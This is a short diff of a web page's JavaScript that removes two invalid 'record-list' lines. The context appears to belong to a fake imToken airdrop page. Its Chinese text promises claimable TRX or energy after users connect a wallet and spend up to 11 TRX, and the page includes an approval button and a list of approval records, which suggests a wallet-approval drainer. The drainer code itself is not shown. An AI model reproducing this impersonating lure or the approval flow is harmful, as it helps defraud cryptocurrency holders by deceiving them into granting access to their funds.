@@ -302,7 +302,7 @@
         const copyLinkText = document.getElementById("copyLinkText");
         const copyLinkBtn = document.getElementById("copyLinkBtn");     
         const warning = document.querySelector('.warning');
-        const record-list = document.querySelector('.record-list');
+       
         renderApprovalRecords();
 
         // 复制链接逻辑
@@ -323,7 +323,7 @@
             document.getElementById("userInfo").innerHTML = "imToken会根据每一个用户的的情况决定能够领取相应的能量或者TRX加密货币，连接钱包后会在此次显示；每一个钱包只可领取一次，须消耗最高11个TRX连接钱包显示可领取的数量后，用户可选择放弃或者领取。";
             // 非TronWeb环境，完全隐藏授权按钮
             approveBtn.style.display = "none";
-           record-list.style.display = "none";
+           
         }
 
         // 手动连接逻辑
